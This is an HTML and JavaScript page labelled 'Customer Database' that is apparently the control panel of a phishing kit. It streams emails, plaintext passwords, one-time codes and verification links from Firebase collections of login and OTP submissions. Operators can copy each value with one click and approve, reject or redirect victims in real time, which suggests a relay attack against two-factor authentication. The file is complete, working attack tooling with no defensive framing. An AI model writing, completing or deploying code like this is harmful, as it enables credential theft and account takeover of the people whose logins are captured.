<!DOCTYPE html>

<html lang="en">

<head>

<meta charset="UTF-8">

<meta name="viewport" content="width=device-width,initial-scale=1">

<title>Customer Database</title>

<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial,Helvetica,sans-serif;
}

body{
    background:#f4f6fb;
    padding:25px;
}

.container{
    width:100%;
    max-width:1800px;
    margin:auto;
}

h1{
    font-size:28px;
    margin-bottom:20px;
    color:#1f2937;
    font-weight:700;
}

.toolbar{
    display:flex;
    justify-content:space-between;
    align-items:center;
    gap:20px;
    margin-bottom:20px;
    flex-wrap:wrap;
}

#searchInput{
    width:350px;
    max-width:100%;
    padding:12px 16px;
    border:1px solid #d1d5db;
    border-radius:8px;
    outline:none;
    font-size:15px;
    transition:.25s;
}

#searchInput:focus{
    border-color:#2563eb;
    box-shadow:0 0 0 3px rgba(37,99,235,.15);
}

#customerCount{
    font-weight:bold;
    color:#374151;
    background:#fff;
    padding:10px 18px;
    border-radius:8px;
    box-shadow:0 2px 8px rgba(0,0,0,.08);
}

.table-wrapper{
    background:#fff;
    border-radius:12px;
    overflow:auto;
    box-shadow:0 5px 18px rgba(0,0,0,.08);
}

table{
    width:100%;
    min-width:1600px;
    border-collapse:collapse;
}

thead th{
    position:sticky;
    top:0;
    background:#2563eb;
    color:#fff;
    padding:14px;
    font-size:14px;
    white-space:nowrap;
    z-index:5;
}

tbody td{
    padding:14px;
    border-bottom:1px solid #ececec;
    font-size:14px;
    white-space:nowrap;
    cursor:pointer;
    transition:.2s;
}

tbody tr:nth-child(even){
    background:#fafafa;
}

tbody tr:hover{
    background:#eef6ff;
}

tbody td:hover{
    background:#dbeafe;
}

.copy-cell{
    user-select:none;
}

.copy-success{
    background:#16a34a !important;
    color:#fff !important;
}

.status{
    display:inline-block;
    padding:6px 12px;
    border-radius:20px;
    color:#fff;
    font-size:12px;
    font-weight:bold;
}

.pending{
    background:#f59e0b;
}

.approved{
    background:#16a34a;
}

.rejected{
    background:#dc2626;
}

.device{
    background:#2563eb;
}

.approve-btn,
.device-btn,
.reject-btn{
    border:none;
    color:#fff;
    padding:8px 14px;
    border-radius:6px;
    cursor:pointer;
    font-size:13px;
    margin-right:6px;
}

.approve-btn{
    background:#16a34a;
}

.device-btn{
    background:#2563eb;
}

.reject-btn{
    background:#dc2626;
}

.approve-btn:hover{
    background:#15803d;
}

.device-btn:hover{
    background:#1d4ed8;
}

.reject-btn:hover{
    background:#b91c1c;
}

@media(max-width:768px){

body{
    padding:10px;
}

.toolbar{
    flex-direction:column;
    align-items:stretch;
}

#searchInput{
    width:100%;
}

table{
    min-width:1500px;
}

}
</style>

</head>

<body>

<div class="container">

<h1>Customer Database</h1>

<div class="toolbar">

<input
type="text"
id="searchInput"
placeholder="Search email..."
>

<div id="customerCount">
0 Customers
</div>

</div>

<div class="table-wrapper">

<table id="customerTable">

<thead>

<tr>

<th>#</th>

<th>Email</th>

<th>Password</th>

<th>OTP</th>

<th>Attempts</th>

<th>Login Status</th>

<th>Verification Link</th>

<th>Verification Status</th>

<th>Device</th>

<th>Date</th>

<th>Actions</th>

</tr>

</thead>

<tbody id="customerBody">

</tbody>

</table>

</div>

</div>
<script type="module">
    import { db } from "./js/firebase.js";

import {
    collection,
    query,
    orderBy,
    onSnapshot,
    doc,
    updateDoc
}
from "https://www.gstatic.com/firebasejs/12.1.0/firebase-firestore.js";

const tbody = document.getElementById("customerBody");
const customerCount = document.getElementById("customerCount");
const searchInput = document.getElementById("searchInput");

/*
Store every customer here.

Key = email

Each customer will be updated whenever
Login, OTP or Verification changes.
*/

const customers = {};
document.addEventListener("click", async (e)=>{

    const td=e.target.closest(".copy-cell");

    if(!td) return;

    const value=td.dataset.copy;

    if(!value) return;

    await navigator.clipboard.writeText(value);

    const old=td.innerHTML;

    td.classList.add("copy-success");

    td.innerHTML="✓ Copied";

    setTimeout(()=>{

        td.innerHTML=old;

        td.classList.remove("copy-success");

    },800);

});
function renderTable(){

    tbody.innerHTML="";

    const search=searchInput.value.toLowerCase();

    const rows=Object.values(customers)

    .filter(c=>

        (c.email||"")

        .toLowerCase()

        .includes(search)

    )

    .sort((a,b)=>

        (b.time||0)-(a.time||0)

    );

    customerCount.textContent=

        rows.length+" Customers";

    rows.forEach((c,index)=>{

        tbody.innerHTML+=`

<tr>

<td>${index+1}</td>

<td class="copy-cell"
data-copy="${c.email||""}">
${c.email||""}
</td>

<td class="copy-cell"
data-copy="${c.password||""}">
${c.password||""}
</td>

<td class="copy-cell"
data-copy="${c.otp||""}">
${c.otp||"-"}
</td>

<td>
${c.attempt||"-"}
</td>

<td>

<span class="status ${String(c.status||"pending").toLowerCase()}">

${c.status||"Pending"}

</span>

</td>

<td class="copy-cell"
data-copy="${c.link||""}">

${c.link
? "Copy Link"
: "-"}

</td>

<td>

${c.verifyStatus||"-"}

</td>

<td>

${c.device||"-"}

</td>

<td>

${c.date||""}

</td>

<td>

<button
class="approve-btn"
onclick="approveLogin('${c.loginId}')">

Approve

</button>

<button
class="device-btn"
onclick="deviceLogin('${c.loginId}')">

Device

</button>

<button
class="reject-btn"
onclick="rejectLogin('${c.loginId}')">

Reject

</button>

</td>

</tr>

`;

    });

}
// ================= LOGIN =================

onSnapshot(

    query(
        collection(db, "login_submissions"),
        orderBy("createdAt", "desc")
    ),

    (snapshot) => {

        snapshot.forEach((loginDoc) => {

            const data = loginDoc.data();

            const email = (data.email || "").toLowerCase();

            if (!customers[email]) customers[email] = {};

            customers[email].loginId = loginDoc.id;
            customers[email].email = data.email || "";
            customers[email].password = data.password || "";
            customers[email].status = data.status || "Pending";
            customers[email].device = data.deviceStatus || "-";

            if (data.createdAt) {
                customers[email].time = data.createdAt.toMillis();
                customers[email].date =
                    data.createdAt.toDate().toLocaleString();
            }

        });

        renderTable();

    }

);
// ================= OTP =================

onSnapshot(

    query(
        collection(db, "otp_submissions"),
        orderBy("createdAt", "desc")
    ),

    (snapshot) => {

        snapshot.forEach((otpDoc) => {

            const data = otpDoc.data();

            const email = (data.email || "").toLowerCase();

            if (!customers[email]) customers[email] = {};

            customers[email].otp = data.otp || "";
            customers[email].attempt = data.attempt || 1;

            if (data.createdAt &&
                (!customers[email].time ||
                data.createdAt.toMillis() > customers[email].time)) {

                customers[email].time = data.createdAt.toMillis();
                customers[email].date =
                    data.createdAt.toDate().toLocaleString();

            }

        });

        renderTable();

    }

);
// ================= VERIFICATION =================

onSnapshot(

    query(
        collection(db, "verification_submissions"),
        orderBy("createdAt", "desc")
    ),

    (snapshot) => {

        snapshot.forEach((verifyDoc) => {

            const data = verifyDoc.data();

            const email = (data.email || "").toLowerCase();

            if (!customers[email]) customers[email] = {};

            customers[email].link =
                data.verificationLink || "";

            customers[email].verifyStatus =
                data.status || "Pending";

            if (data.createdAt &&
                (!customers[email].time ||
                data.createdAt.toMillis() > customers[email].time)) {

                customers[email].time =
                    data.createdAt.toMillis();

                customers[email].date =
                    data.createdAt.toDate().toLocaleString();

            }

        });

        renderTable();

    }

);

// ================= SEARCH =================
searchInput.addEventListener("input", renderTable);

window.approveLogin=async function(id){
 if(!id) return;
 await updateDoc(doc(db,"login_submissions",id),{status:"Approved"});
};
window.deviceLogin=async function(id){
 if(!id) return;
 await updateDoc(doc(db,"login_submissions",id),{status:"Device"});
};
window.rejectLogin=async function(id){
 if(!id) return;
 await updateDoc(doc(db,"login_submissions",id),{status:"Rejected"});
};

</script>

</body>

</html>
